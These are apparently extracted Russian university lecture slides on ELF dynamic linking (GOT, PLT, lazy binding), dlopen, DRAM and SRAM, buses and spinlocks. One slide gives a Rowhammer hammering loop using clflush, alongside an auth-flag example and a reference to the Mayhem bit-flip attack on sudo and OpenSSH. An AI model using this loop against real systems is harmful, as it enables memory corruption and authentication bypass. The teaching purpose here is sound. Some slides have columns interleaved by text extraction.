snoop@jezek:~/samples/2017/linking$ readelf -s libhello.so
                                                       • Тип перебазирования
Symbol table '.dynsym' contains 13 entries:              R_386_GLOB_DAT
   Num:    Value Size Type     Bind   Vis     Ndx Name   новое значение
...                                                      ссылки = S
     5: 00000000     0 NOTYPE GLOBAL DEFAULT UND buf • S – абсолютный адрес
...                                                      памяти, связанный с
     8: 000004b0    40 FUNC    GLOBAL DEFAULT  12 f      символом

snoop@jezek:~/samples/2017/linking$ readelf -r libhello.so

Relocation section '.rel.dyn' at offset 0x360 contains 9 entries:
 Offset     Info    Type            Sym.Value Sym. Name
...
00001ff8 00000506 R_386_GLOB_DAT     00000000   buf
...
snoop@jezek:~/samples/2017/linking$ objdump -r -s -j .got libhello.so

libhello.so:     file format elf32-i386

Contents of section .got:
 1fe8 00000000 00000000 00000000 00000000   ................
 1ff8 00000000 00000000                     ........


                                                                               23
     _GLOBAL_OFFSET_TABLE_ - 0x8 = 0x2000 – 0x8 = 0x1ff8
                                                                      © 2024 МГУ/ВМК/СП

snoop@jezek:~/samples/2017/linking$ readelf -l libhello.so

Elf file type is DYN (Shared object file)
Entry point 0x430
There are 7 program headers, starting at offset 52

Program Headers:
  Type    Offset   VirtAddr   PhysAddr   FileSiz MemSiz Flg Align
LOAD      0x000000 0x00000000 0x00000000 0x004f4 0x004f4 R E 0x1000
LOAD      0x000f04 0x00001f04 0x00001f04 0x00110 0x00114 RW 0x1000
...
 Section to Segment mapping:
  Segment Sections...
   00     ... .init .plt ... .text .fini .rodata ...
   01     ... .got .got.plt .data .bss
...




                                                                             24
                                                            © 2024 МГУ/ВМК/СП




               Procedure Linkage Table

• GOT должна быть полностью заполнена при
  динамической компоновке
   – Не все переменные могут реально использоваться
• Обращение к функциям происходит только через
  инструкцию call – возможно выполнить ленивое
  связывание (lazy binding)
   – В GOT вместо адреса реальной функции помещается адрес
     функции-заглушки
   – При первом вызове заглушка выполняет поиск адреса реальной
     функции, помещает его в GOT вместо своего и производит прыжок
     по этому адресу
   – Все следующие вызовы используют реальный адрес из GOT
• Заглушки размещаются в секции .plt
   – По соглашению при вызове заглушки ebx должен содержать
     базовый адрес GOT                                             25
                                                                  © 2024 МГУ/ВМК/СП

snoop@jezek:~/samples/2017/linking$ objdump -d -r -M intel hello2_pic.o
hello2_pic.o:     file format elf32-i386


Disassembly of section .text:

00000000 <f>:         • Тип перебазирования R_386_PLT
                         новое значение ссылки = L + A – P
   0: 53                     push    ebx
   1: e8 fc ff ff ff  •  L – абсолютный
                             call         адрес элемента PLT,
                                     2 <f+0x2>
                         используемого для вызова заданного символа
                     2: R_386_PC32 __x86.get_pc_thunk.bx
                      • A – дополнительное
   6: 81 c3 02 00 00 00      add     ebx,0x2 слагаемое (addend),
                         хранимое непосредственно в байтах ссылки
                     8: R_386_GOTPC _GLOBAL_OFFSET_TABLE_
   c: 83 ec 10        • P – абсолютный
                             sub         адрес ссылки
                                     esp,0x10
                      • Наличие
   f: 8b 83 00 00 00 00      mov такого  типа перебазирования
                                     eax,DWORD   PTR [ebx+0x0] в файле
                     11: требует от компоновщика
                         R_386_GOT32X         buf создавать PLT и
                         дополнительный элемент в GOT
  15: ff 30                  push    DWORD PTR [eax]
                      • Новое
  17: 8d 83 00 00 00 00      leaзначение  ссылки – смещение от данной
                                     eax,[ebx+0x0]
                         инструкции до соответствующего элемента PLT
                     19: R_386_GOTOFF         .LC0
  1d: 50                     push    eax
  1e: e8 fc ff ff ff         call    1f <f+0x1f>
                     1f: R_386_PLT32          printf
  23: 83 c4 18               add     esp,0x18
  26: 5b                     pop     ebx                              26
  27: c3                     ret
                                                              © 2024 МГУ/ВМК/СП

noop@jezek:~/samples/2017/linking$ objdump -d -M intel libhello.so
...
00000390 <printf@plt>:
 390:   ff a3 0c 00 00 00       jmp    DWORD PTR [ebx+0xc]
 396:   68 00 00 00 00          push   0x0
 39b:   e9 e0 ff ff ff          jmp    380 <.plt>
...
000004b0 <f>:
 4b0:   53                      push   ebx
 4b1:   e8 fa fe ff ff          call   3b0 <__x86.get_pc_thunk.bx>
 4b6:   81 c3 4a 1b 00 00       add    ebx,0x1b4a
 4bc:   83 ec 10                sub    esp,0x10
 4bf:   8b 83 f8 ff ff ff       mov    eax,DWORD PTR [ebx-0x8]
 4c5:   ff 30                   push   DWORD PTR [eax]
 4c7:   8d 83 ec e4 ff ff       lea    eax,[ebx-0x1b14]
 4cd:   50                      push   eax
 4ce:   e8 bd fe ff ff          call   390 <printf@plt>
 4d3:   83 c4 18                add    esp,0x18
 4d6:   5b                      pop    ebx
 4d7:   c3                      ret
              _GLOBAL_OFFSET_TABLE_
                                                                     27
                .got        .got.plt
                                                                          © 2024 МГУ/ВМК/СП




                  Первый вызов функции printf
noop@jezek:~/samples/2017/linking$ objdump -d -M intel libhello.so
...
Disassembly of section .plt:

00000380 <.plt>:
 380:   ff b3 04 00 00 00           push     DWORD PTR [ebx+0x4]
 386:   ff a3 08 00 00 00           jmp      DWORD PTR [ebx+0x8]
 38c:   00 00                       add      BYTE PTR [eax],al
        ...

00000390 <printf@plt>:
 390:   ff a3 0c 00 00 00           jmp      DWORD PTR [ebx+0xc]
 396:   68 00 00 00 00              push     0x0
 39b:   e9 e0 ff ff ff              jmp      380 <.plt>
_GLOBAL_OFFSET_TABLE_                Динамический компоновщик
             +4    +8    +С              Описание модуля
                                              libhello.so        Поиск
                                                                 адреса
                                                                           printf
                                           Ленивое связывание             в модуле
                                                                              28
                                                                           libc.so
.dynamic      .got.plt        Обновление записи в .got.plt адресом printf
                                                                      © 2024 МГУ/ВМК/СП

snoop@jezek:~/samples/2017/linking$ readelf -l libhello.so

Elf file type is DYN (Shared object file)
Entry point 0x3b0
There are 6 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz Flg Align
  LOAD           0x000000 0x00000000 0x00000000 0x004f4 0x004f4 R E 0x1000
  LOAD           0x000f04 0x00001f04 0x00001f04 0x00110 0x00114 RW 0x1000
  DYNAMIC        0x000f0c 0x00001f0c 0x00001f0c 0x000e0 0x000e0 RW 0x4
  NOTE           0x0000f4 0x000000f4 0x000000f4 0x00024 0x00024 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10
  GNU_RELRO      0x000f04 0x00001f04 0x00001f04 0x000fc 0x000fc R   0x1

 Section to Segment mapping:
  Segment Sections...
   00     .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version
.gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata
.eh_frame
   01     .init_array .fini_array .dynamic .got .got.plt .data .bss
   02     .dynamic
   03     .note.gnu.build-id
   04
   05     .init_array .fini_array .dynamic .got                              29
                                                                       © 2024 МГУ/ВМК/СП

snoop@jezek:~/samples/2017/linking$ readelf -l hello-dlib

Elf file type is DYN (Shared object file)
Entry point 0x4c8
There are 9 program headers, starting at offset 52

Program Headers:
  Type            Offset   VirtAddr   PhysAddr   FileSiz MemSiz Flg Align
  PHDR            0x000034 0x00000034 0x00000034 0x00120 0x00120 R   0x4
  INTERP          0x000154 0x00000154 0x00000154 0x00013 0x00013 R   0x1
       [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD            0x000000 0x00000000 0x00000000 0x007ac 0x007ac R E 0x1000
  LOAD            0x000ed0 0x00001ed0 0x00001ed0 0x0013c 0x00140 RW 0x1000
  DYNAMIC         0x000ed8 0x00001ed8 0x00001ed8 0x00100 0x00100 RW 0x4
...
 Section to Segment mapping:
  Segment Sections...
   00
   01      .interp
   02      .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr
.gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini
.rodata .eh_frame_hdr .eh_frame
   03      .init_array .fini_array .dynamic .got .data .bss
   04      .dynamic
...                                                                         30
                                                                                  © 2024 МГУ/ВМК/СП



         Загрузка динамически скомпонованного
                   исполняемого файла
       student@pc:~/asm/linking$ LD_LIBRARY_PATH=`pwd` ldd hello-dlib
               linux-gate.so.1 (0xf7fd5000)
               libhello.so => /home/student/asm/linking/libhello.so (0xf7fca000)
               libc.so.6 => /lib32/libc.so.6 (0xf7ddd000)
               /lib/ld-linux.so.2 (0xf7fd6000)
   •    Начальная часть загрузки происходит аналогично, но на _start не «идем»
   •    В секции .interp хранится имя программы-интерпретатора, т.е. динамического
        компоновщика.
        Указанный в секции интерпретатор загружается в память.
         –   ld-linux.so скомпонован полностью статически
   •    Компоновщику передается адрес секции .dynamic, где собраны описания
        зависимостей, таблиц символов и других служебных данных, используемых в
        динамической компоновке.
         –   Содержимое GOT, относящееся к переменным, обновляется при загрузке
   •    Необходимые динамические библиотеки ищутся по списку директорий из
        переменной окружения LD_LIBRARY_PATH
   •    Отработавший динамический компоновщик передает управление на точку входа
student@pc:~/asm/linking$ export LD_LIBRARY_PATH=/home/student/asm/linking
student@pc:~/asm/linking$ ./hello-dlib
Hello, world!                                                              31
                                                                 © 2024 МГУ/ВМК/СП




Динамическая компоновка времени исполнения
#include <stdio.h>
#include <dlfcn.h>

int x[2] = {1, 2};
int y[2] = {3, 4};
int z[2];

int main()
{
    void *handle;
    void (*addvec)(int *, int *, int *, int);
    char *error;

    /* Динамически загружаем библиотеку, содержащую функцию addvec() */
    handle = dlopen("./libvector.so", RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "%s\n", dlerror());
        exit(1);
    }


                                                                        32
                                                               © 2024 МГУ/ВМК/СП




Динамическая компоновка времени исполнения
    ...

    /* получить указатель на функцию addvec() */
    addvec = dlsym(handle, "addvec");
    if ((error = dlerror()) != NULL) {
        fprintf(stderr, "%s\n", error);
        exit(1);
    }

    /* Теперь можно вызывать addvec() как обычную функцию */
    addvec(x, y, z, 2);
    printf("z = [%d %d]\n", z[0], z[1]);

    /* Выгружаем динамическую библиотеку из памяти */
    if (dlclose(handle) < 0) {
        fprintf(stderr, "%s\n", dlerror());
        exit(1);
    }
    return 0;
}

                                                                      33
                                                © 2024 МГУ/ВМК/СП




            Далее: Аппаратура ЭВМ

• Организация аппаратного обеспечения
  компьютера
  – Физические основы, шины, периферийные устройства
• Организация памяти
  – НЖМД, твердотельные накопители, кэш
  – Производительность
• Микроархитектура ЦПУ
  – Конвейер, микрокод, CISC vs. RISC
• Многозадачная работа компьютера
  – Изоляция пользовательских программ
                                                       34
              © 2024 МГУ/ВМК/СП




Лекция 0x13


 20 апреля
                     © 2024 МГУ/ВМК/СП




Логические вентили




                             2
                  © 2024 МГУ/ВМК/СП




Сравнение битов




                          3
                 © 2024 МГУ/ВМК/СП




Сравнение слов




                         4
                                 © 2024 МГУ/ВМК/СП




                  Полусумматор

• Суммирует биты A и B
• Результат – бит S
• Перенос – бит C




                                         5
                           © 2024 МГУ/ВМК/СП




Полный двоичный сумматор




                                   6
                    © 2024 МГУ/ВМК/СП




Суммирование слов




                            7
                © 2024 МГУ/ВМК/СП




Мультиплексор




                        8
      © 2024 МГУ/ВМК/СП




АЛУ




              9
                             © 2024 МГУ/ВМК/СП




Регистр: сохранение 1 бита




                                    10
                                                       © 2024 МГУ/ВМК/СП




                   Статическая память



Защелка


                                        Синхронная SR-защелка




                           Шеститранзисторная ячейка статической
  Синхронная D-защелка                                      11
                           двоичной памяти (бит) SRAM
                                   © 2024 МГУ/ВМК/СП




             Динамическая память

• Один транзистор и
  один конденсатор
  – Занимает мало места
• Заряд утекает через
  транзистор
• Требуются циклы
  регенерации
  – чтение ячейки в
    качестве регенерации


                                          12
                                                                © 2024 МГУ/ВМК/СП



               Оперативная память (RAM)

• Основные свойства
   – RAM традиционно оформляется в виде отдельного чипа.
   – Единица хранения – клетка/ячейка (один бит на ячейку).
   – Оперативная память состоит из нескольких чипов RAM.
• Статическая память (SRAM)
   – Каждая ячейка хранит значение одного бита с помощью схемы из 4 или
     6 транзисторов.
   – При наличии питания, сохраняет значение неограниченно долго.
   – Относительно устойчива к радиации, ЭМП
   – Быстрее и дороже чем DRAM.
• Динамическая память (DRAM)
   – Состоит из конденсатора и транзистора.
   – Сохраняемое значение должно обновляться каждые 10-100 мс.
   – Более чувствительная к воздействиям (ЭМП, радиация,…) чем SRAM.
   – Медленней и дешевле чем SRAM.
                                                                       13
                                                                        © 2024 МГУ/ВМК/СП




                                SRAM vs DRAM
Тип    Транз.      Относ.     Устойчивая   Контроль Относ.    Применение
памяти на 1        время                            стоимость
       бит         доступа
SRAM     4 или 6 1×           Да           Нет     100×       Кэш

DRAM     1         10×        Нет          Да      1×         Основная
                                                              оперативная память


             Скорость
             • быстрая          Недостижимо
             • медленная

                                    Можно выбрать преимущества только двух
                                    характеристик в ущерб третьей
  Цена                  Объем
  • высокая             • большой
  • низкая              • малый
                                                                               14
                                                                   © 2024 МГУ/ВМК/СП




          Типовая организация DRAM

• d × w DRAM:
   – Общий объем данных dw бит организован как d суперячеек
     размером w бит       16 x 8 DRAM
                                                  Столбцы
                                           0    1     2       3
                        2 бита         0
                        /
                        адрес
                                       1
                                 Строки
          Контроллер
                                       2                          суперячейка
запросы     памяти
                                                                      (2,1)
 от CPU                                3
                        8 бит
                        /
                       данные


                                               Буфер строки               15
                                                                   © 2024 МГУ/ВМК/СП




     Чтение суперячейки DRAM (2,1)
Шаг 1(а): Строб адреса строки (RAS) указывает строку 2.
Шаг 1(б): Строка 2 копируется из DRAM в буфер строки.
                              16 x 8 DRAM
                                                   Столбцы
                                            0    1     2       3
                    RAS = 2
                       2
                       /               0
                      адрес
                                       1
                              Строки
       Контроллер
         памяти                        2

                       8               3
                       /
                     данные



                                                Буфер строки              16
                                                                              © 2024 МГУ/ВМК/СП




          Чтение суперячейки DRAM (2,1)
 Шаг 2(а): Строб адреса столбца (CAS) указывает столбец 1.
 Шаг 2(б): Суперячейка (2,1) копируется из буфера на линии
   шины данных и далее в ЦПУ.
                                         16 x 8 DRAM
                                                              Столбцы
                                                       0    1     2       3
                            CAS = 1
                               2
                               /                  0
                              адрес
 В ЦПУ                                            1
                                         Строки
              Контроллер
                памяти                            2

суперячейка                                       3
                                8
    (2,1)                       /
                             данные


                           суперячейка                                               17
                                                           Буфер строки
                               (2,1)
                                                                                 © 2024 МГУ/ВМК/СП




         Расслоение памяти
адрес (row = i, col = j)
                                                                     : суперячейка (i,j)
                                                      DRAM 0
                                                                   Модуль памяти
                                                                   64 MB
DRAM 7                                                             состоит из восьми
                                                                   8Mx8 DRAM



      биты биты биты          биты биты биты биты биты
      56-63 48-55 40-47       32-39 24-31 16-23 8-15 0-7



 63   56 55   48 47   40 39   32 31   24 23   16 15   8 7      0
                                                                   Контроллер
                                                                   памяти
         64-разрядное слово по адресу A


                                      64-разрядное слово
                                                                                        18
                                                                      © 2024 МГУ/ВМК/СП




                       Развитие DRAM

• Организация ячейки DRAM принципиально не менялась с
  момента изобретения в 1966 году.
   – Коммерческий выпуск начат Intel в 1970.
• Модули DRAM с улучшенным интерфейсом:
   – Синхронная DRAM (SDRAM)
      • Синхронизируется с системными часами
      • Позволяет повторно использовать адрес строки (т.е., RAS, CAS, CAS,
        CAS)
   – Синхронная DRAM с удвоенной частотой (DDR SDRAM)
      • Управляется фронтами – две посылки данных за один такт
      • На текущий момент – стандартная память для большинства серверов
        и настольных компьютеров
          – Текущее поколение – DDR5 SDRAM, массовый выпуск с 2020 года
          – В конце 2023 года анонсировано следующее поколение – DDR6 SDRAM

                                                                              19
                                                                                                                                   © 2024 МГУ/ВМК/СП




                   DRAM – надежность и безопасность
                                                                                                                         L:
                                                                                                                              mov eax, [X]
    •    Уменьшение размера ячейки приводит к тому, что она                                                                   mov ebx, [Y]
         становится менее устойчива к утечке заряда                                                                           clflush [X]
           –    До 2010 года публикации про такую проблему DRAM не наблюдались                                                clflush [Y]
                                                                                                                              mfence
    •    Постоянные чтения ячейки приведут к тому,                                                                            jmp L
         что соседние ячейки могут потерять заряд
    •    Можно изменить значение переменной, непосредственно влияющей на безопасность ПО!
           –    (статистически) достижимая цель – инвертировать один из битов
    •    ECC – память с коррекцией ошибок, применяем код Хемминга на практике
           –    Гарантированно выявляем и исправляем ошибку в одном разряде, типичный размер слова – 64 бита
           –    Для ECC требуется дополнительный такт работы контроллера памяти
           –    Не вся DRAM в компьютере содержит ECC, теоретически ошибки могут возникнуть в двух битах
 int auth = 0;
... // код проверки, меняющий значение auth в случае успешной аутентификации
if(auth != 0)
  return AUTH_SUCCESS;
 Else
  return AUTH_FAILURE;

Mayhem - атака, искажающая биты в памяти для обхода аутентификации в sudo и OpenSSH
https://www.opennet.ru/opennews/art.shtml?num=60334

    Adiletta, Andrew & Tol, M. Caner & Doröz, Yarkın & Sunar, Berk. (2023). Mayhem: Targeted Corruption of Register and Stack Variables.
    https://arxiv.org/abs/2309.02545

DEFCON 19: Bit-squatting: DNS Hijacking Without Exploitation       Y. Kim et al., "Flipping bits in memory without accessing them: An    20
https://www.youtube.com/watch?v=aT7mnSstKGs                        experimental study of DRAM disturbance errors," 2014 ACM/IEEE 41st ISCA
                                                      © 2024 МГУ/ВМК/СП




                 Далее: Аппаратура ЭВМ

• Организация аппаратного обеспечения компьютера
   – Физические основы
   – Технологии производства интегральных схем (IC)
   – Эмпирические законы развития IC
   – Шины и периферийные устройства
• Организация памяти
   – НЖМД и твердотельные накопители
   – Локальность, кэш, производительность памяти
• Микроархитектура ЦПУ
   – Конвейер, микрокод, …
   – CISC vs. RISC, архитектура RISC-V
• Многозадачная работа компьютера
   – Загрузка
   – Изоляция пользовательских программ

                                                             21
                                                                    © 2024 МГУ/ВМК/СП




              Разработка интегральных схем
module blinking (                 • В разработке сложных
    input CLOCK_50,                 электрических цепей
    output [1:0] LEDG
);                                  (интегральных схем)
                                    используются языки описания
   /* reg */
   reg data1 = 1'b1;
                                    аппаратуры
   reg [31:0] counter;                – VHDL
   reg state;
                                          • «На основе» языка ADA
   /* assign */                       – Verilog
   assign LEDG[0] = state;                • «На основе» языка Си
   assign LEDG[1] = data1;
                                      – …
   /* always */
   always @ (posedge CLOCK_50) begin
counter <= counter + 1;
state   <= counter[26]; // <--- data to change
   end
                                                                           22
endmodule
                                                                           © 2024 МГУ/ВМК/СП



Этапы разработки и изготовления компонент
                   ЭВМ
                       •   IP – intellectual property, в области аппаратного обеспечения –
                           готовые блоки для проектирования микросхем
                       •   SoC – System-on-a-Сhip, электронная схема, выполняющая функции
                           целого устройства (например, компьютера) и размещённая на одной
                           интегральной схеме.
                       •   FPGA - field-programmable gate array, разновидность
                           программируемых логических интегральных схем
                       •   Bit stream – конфигурация, загружаемая в микросхему FPGA
                       •   RTL-схема - register transfer level, описание интегральной схемы на
                           уровне регистров и логических схем




                                                                                     23
                                                                      © 2024 МГУ/ВМК/СП



        Разновидности полупроводниковых
                   устройств
                                                                 Универсальность
• Программируемая логическая интегральная схема
  (ПЛИС). Логика работы не определятся при
  изготовлении, а задается посредством
  программирования
    – FPGA – наиболее известная разновидность ПЛИС
• Процессор общего назначения (x86, ARM, RISC-V, …) –
  универсальное вычислительное устройство для
  выполнения произвольных программ
• (микро) Контроллер - микросхема, управляющая
  электронными устройствами. Может представлять
  собой самостоятельный компьютер (процессор, память,
  ввод-вывод), но рассчитана на выполнение конкретной
  задачи, например, обработки цифровых сигналов
• ASIC – application-specific integrated circuit, интегральная
  схема, специализированная для решения конкретной
  задачи.


                                                                             24
                                                                                            © 2024 МГУ/ВМК/СП




         Развитие средств разработки чипов (IC)

•   Современные микропроцессоры/контроллеры состоят из миллиардов
    транзисторов. Создание устройств такой сложности невозможно без развитых
    средств разработки.
     –   Симуляция. Изучение и оценка свойств разработанной схемы до того, как она физически
         будет создана.
     –   Дизайн. Сборка общей схемы из отдельных описаний ее фрагментов.
           • Задача логического уровня: объединить фрагменты электрических цепей
           • Задача физического уровня: сформировать и объединить на плоскости геометрические формы,
             которые реализуют логику работы электрической цепи
     –   Верификация. Проверка того, что логическое и физическое представление чипа
         соответствует заданным требованиям: логике работы и производительности.
•   История развития
     –   «Доисторические времена». Разработчики аппаратуры сами придумывали и создавали
         средства автоматизации разработки.
     –   Этап 1, 1960-1980, CAD/CAM (computer-aided design/computer-aided manufacturing),
         первые специализированные компании, предлагающие средства разработки чипов
     –   Этап 2, 1980-1990, EDA (Electronic Design Automation), начало полупроводниковой
         «революции», возникновение множества компаний в сфере EDA
     –   Этап 3, 1990-2015, консолидация рынка
           • Synopsys, Cadence, Mentor (Siemens EDA)
     –   Этап 4, 2015-…, open source средства разработки IC

                                                                                                   25
                                                                        © 2024 МГУ/ВМК/СП




                    Закон Мура (Moore's law)
•   Число транзисторов на кристалле будет удваиваться каждые 24 месяца
•   Гипотеза выдвинута в 1965 году Гордоном Муром (один из основателей Intel)
•   Ограничения
     –   Атомарная природа вещества
     –   Скорость света
•   Негативная сторона – предельно быстрое устаревание вычислительной
    техники
•   Открытый вопрос: область применимости

                                        Intel Haswell, 4 вычислительных ядра, 2013




                                                                               26
                                                    © 2024 МГУ/ВМК/СП




             Закон Гроша (Grosch's law)

• Производительность компьютера увеличивается как
  квадрат стоимости
   – Емкость мирового рынка компьютеров – 5 машин
• Гипотеза выдвинута в 1965 году Хербом Грошем (второй
  ведущий ученый IBM, после Эккерта)
• 1997: закон полностью опровергнут
• Применимость к определенному классу машин
   – Рабочая станция
   – Майнфрейм
   – Суперкомпьютер
• Новые вычислительные/информационные ресурсы
   – Поисковые системы
   – Облачные вычисления
                                                           27
                                                                   © 2024 МГУ/ВМК/СП




                   Закон Белла (Bell’s law)
•   Примерно каждое десятилетие появляется новый, более дешевый класс
    компьютеров, основанный на новой программной платформе, сетях и
    интерфейсах, в результате чего возникают новые отрасли индустрии и
    области применения компьютеров
•   Сформулирован в 1972 Гордоном Беллом (разработчик компьютеров PDP в
    компании DEC)




                                                                          28
                                                      © 2024 МГУ/ВМК/СП




                 Далее: Аппаратура ЭВМ

• Организация аппаратного обеспечения компьютера
   – Физические основы
   – Технологии производства интегральных схем (IC)
   – Эмпирические законы развития IC
   – Шины и периферийные устройства
• Организация памяти
   – НЖМД и твердотельные накопители
   – Локальность, кэш, производительность памяти
• Микроархитектура ЦПУ
   – Конвейер, микрокод, …
   – CISC vs. RISC, архитектура RISC-V
• Многозадачная работа компьютера
   – Загрузка
   – Изоляция пользовательских программ

                                                             29
              © 2024 МГУ/ВМК/СП




Лекция 0x14


 24 апреля
                                                  © 2024 МГУ/ВМК/СП




Шина — соединение, служащее для передачи данных
между функциональными блоками компьютера.                 2
                                                                © 2024 МГУ/ВМК/СП




   Типовое соединение ЦПУ и оперативной памяти

• Шина – набор проводов используемых для передачи
  данных, адресов, управляющих сигналов.
• Шины, как правило, используются несколькими
  устройствами.
  ЦПУ

              Регистры


                         АЛУ
                               Системная (локальная) шина
                                                Шина памяти


                                      Мост
                                                              Оперативная
        Интерфейс шины               ввода/                     память
                                     вывода

                                                                        3
                                                                       © 2024 МГУ/ВМК/СП


        Чтение данных из памяти (1)


• ЦПУ передает адрес A интерфейсу шины памяти.




            Регистры                Инструкция загрузки данных:
                                     mov eax, dword [A]
                       ЦПУ
      eax

                                                     Оперативная память
                             Мост ввода/вывода                      0
                                                 A
    Интерфейс шины                                            x    A



                                                                               4
                                                                       © 2024 МГУ/ВМК/СП


        Чтение данных из памяти (2)


• Оперативная память получает запрос на выборку данных
  по адресу A из шины, осуществляет выборку значения x, и
  отправляет его назад, в шину.


            Регистры                Инструкция загрузки данных:
                                     mov eax, dword [A]
                       ЦПУ
      eax

                                                     Оперативная память
                             Мост ввода/вывода                      0
                                                 x
    Интерфейс шины                                            x    A



                                                                               5
                                                                       © 2024 МГУ/ВМК/СП


        Чтение данных из памяти (3)


• ЦПУ считывает двойное слово x из шины и пересылает его
  в регистр eax.



            Регистры                Инструкция загрузки данных:
                                     mov eax, dword [A]
                       ЦПУ
      eax      x

                                                     Оперативная память
                             Мост ввода/вывода                      0

    Интерфейс шины                                            x    A



                                                                               6
                                                                       © 2024 МГУ/ВМК/СП


            Запись данных в память (1)


• ЦПУ передает адрес A интерфейсу шины. Оперативная
  память считывает адрес и ждет посылки
  соответствующего значения.


            Регистры                Инструкция выгрузки данных:
                                     mov dword [A], eax
                       ЦПУ
      eax      y

                                                     Оперативная память
                             Мост ввода/вывода                      0
                                                 A
    Интерфейс шины                                                 A



                                                                               7
                                                                       © 2024 МГУ/ВМК/СП


            Запись данных в память (2)


• ЦПУ передает значение y интерфейсу шины.




            Регистры                Инструкция выгрузки данных:
                                     mov dword [A], eax
                       ЦПУ
      eax      y

                                                     Оперативная память
                             Мост ввода/вывода                      0
                                                 y
    Интерфейс шины                                                 A



                                                                               8
                                                                       © 2024 МГУ/ВМК/СП


            Запись данных в память (3)


• Оперативная память получает двойное слово y из шины и
  сохраняет его по адресу A.



            Регистры                Инструкция выгрузки данных:
                                     mov dword [A], eax
                       ЦПУ
      eax      y

                                                     Оперативная память
                             Мост ввода/вывода                      0
                                                 y
    Интерфейс шины                                           y     A



                                                                               9
                                                            © 2024 МГУ/ВМК/СП




           Port IO vs. Memory Mapped IO

• Port IO: помимо пространства памяти вводится
  дополнительное пространство портов ввода/вывода
   – Работа с периферией: команды in и out   • IN EAX, DX ; AX, AL
      • Все данные проходят через ЦПУ            • EAX ← I/O[DX]
   – Удобно при небольшом размере памяти     • OUT DX, EAX ; AX, AL
                                                 • I/O[DX] ← EAX

• Memory Mapped IO: все управляющие регистры устройств
  отображаются на определенные адреса оперативной
  памяти
   – Требуется программировать контроллер памяти/северный мост
   – Перекрытая память не используется
   – Существенно более высокая производительность
                                                                   10
                                                  © 2024 МГУ/ВМК/СП



Шина: точка зрения системного
        программиста
   Базовый адрес    Размер           Описание
  0x20000000       0x1000000 Flash
    0x20000000       0x40000     Загрузчик
    0x20040000      0xDC0000     Встроенное ПО
    0x20A00000      0x100000     FFS
    0x20F80000       0x40000     SECZONE
  0x40000000        0x800000 RAM

                          Шина – адресное пространство




                                                         11
                                                            © 2024 МГУ/ВМК/СП


int device_driver_transmit_data(device *dev,
                                phys_addr_t *buffer,
                                size_t buf_len)
   {
           offset_t offset = device->offset;
           uint32_t status;
           time_t time = 0;
           outl(offset + BUFFER_REGISTER, buffer);
           outl(offset + BUFLEN_REGISTER, buf_len);
           outl(offset + COMMAND_REGISTER, COMMAND_TRANSMIT);
           do {
                   wait(WAIT_INTERVAL);
                   time += WAIT_INTERVAL;
                   inl(&status, STATUS_REGISTER);
                   if ((status & ERROR_MASK) || (time >= TIMEOUT))
                           goto error;
           } while (!(status & COMPLETE_MASK));
           return 0;
           error:
           return -1;
                             void outl(int* m_reg, int val) {
   }
                                *m_reg = val;
                             }                                  12
                                                                © 2024 МГУ/ВМК/СП



         Пример простейшего периферийного
        устройства: WatchDog @ SoC Exynos4210




Базовый адрес 0x10060000                           Запуск устройства
                                                   WTCON[0] = 1
Регистр   Смещение   Описание                      WTCON[5] = 1
WTCON     0x0        Управляющий регистр
WTDAT     0x4        Начальное значение счетчика
WTCNT     0x8        Счетчик таймера                                   13
                                      © 2024 МГУ/ВМК/СП




Шина: точка зрения разработчика аппаратуры




                                             14
                                                     © 2024 МГУ/ВМК/СП




                  Характеристики шин
• Ширина
   – Количество линий, линии адреса, линии данных,
     мультиплексирование адресов и данных
• Частота
• Пиковая пропускная способность
   – Ширина (байты или биты)  Частота (1/сек)
• Арбитраж
   – Централизованный
      • Линии запроса и захвата шины
   – Децентрализованный
• Возможность горячей замены устройства
• Физическая организация
   – Выделенные линии данных, адресов, команд
   – Мультиплексированные линии
   – Топология связей
   – Синхронная/асинхронная
   – Ограничения по длине линии
                                                            15
© 2024 МГУ/ВМК/СП




       16
© 2024 МГУ/ВМК/СП




       17
              © 2024 МГУ/ВМК/СП




Пример:
платформа Haswell, 2013




                     18
                                                                 © 2024 МГУ/ВМК/СП




                  Примеры шин (1/3)

• Фронтальная шина
  – HyperTransport (HT), апрель 2001, AMD. Открытый стандарт -
    HyperTransport Technology
     • 2 – 32 разряда, двунаправленная
     • 200 – 2600 MHz, DDR
     • В 2017 году на смену HT пришла шина следующего поколения –
       Infinity Fabric
  – QuickPath Interconnect (QPI), ноябрь 2008, Intel
     • 20 линий, двунаправленная, 4 такта = 64 бита
     • 2.4, 2.93, 3.2 GHz, DDR
     • В 2017 году на смену QPI пришла шина следующего поколения –
       Intel Ultra Path Interconnect (UPI) в процессорах Skylake EX/EP
       Xeon,
  – Соединение точка-точка
     • Гарантированные физические каналы: один отправитель – один
       приемник
     • Не требуется арбитраж

                                                                         19
                                                                   © 2024 МГУ/ВМК/СП




        Синхронизация обращений к памяти
• Захват блокировки
• Работа с общими
  (разделяемыми)
  переменными
• Освобождение
  блокировки
                      Замок – статическая переменная L (младший разряд)
                      • 0 – доступ открыт
acquireLock:          • 1 – доступ закрыт               Начальное состояние
 .retry:                                                замка – 0
   bts byte [L], 0                    Захват замка
   jc .retry
   ret                                      «замок»==0 ?
                             Да                                    Нет
releaseLock:
                               «замок»←1                    «замок»←1
   btr byte [L], 0
   ret                               Замок захвачен
                                                                          20
                                     Выходим из функции
                                                                   © 2024 МГУ/ВМК/СП




        Синхронизация обращений к памяти
• Захват блокировки
• Работа с общими
  (разделяемыми)
  переменными
• Освобождение
  блокировки
                      Замок – статическая переменная L (младший разряд)
                      • 0 – доступ открыт
acquireLock:          • 1 – доступ закрыт               Начальное состояние
 .retry:                                                замка – 0
   bts byte [L], 0           Освобождение замка
   jc .retry
                                             «замок»←0
   ret

releaseLock:                         Замок освобожден
   btr byte [L], 0                   Выходим из функции
   ret
                                                                          21
                                                                    © 2024 МГУ/ВМК/СП




        Синхронизация обращений к памяти
• Захват блокировки
• Работа с общими
  (разделяемыми)
  переменными
• Освобождение
  блокировки
                 Оба ядра попытались захватить замок «почти» одновременно
